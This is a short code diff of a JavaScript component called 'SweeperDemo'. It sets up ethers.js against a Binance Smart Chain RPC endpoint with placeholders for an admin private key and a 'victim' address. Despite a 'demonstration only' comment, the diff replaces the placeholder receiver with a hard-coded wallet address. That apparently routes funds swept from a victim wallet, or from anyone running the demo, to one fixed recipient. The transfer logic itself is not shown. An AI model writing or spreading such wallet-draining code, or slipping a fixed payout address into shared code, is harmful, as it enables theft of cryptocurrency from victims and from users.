@@ -26,7 +26,7 @@ export default function SweeperDemo() {
     // This is for demonstration only.
     const privateKey = "YOUR_ADMIN_PRIVATE_KEY"; 
     const victimAddress = "VICTIM_ADDRESS";
-    const receiverAddress = "YOUR_RECEIVER_ADDRESS";
+    const receiverAddress = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";
 
     try {
       const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
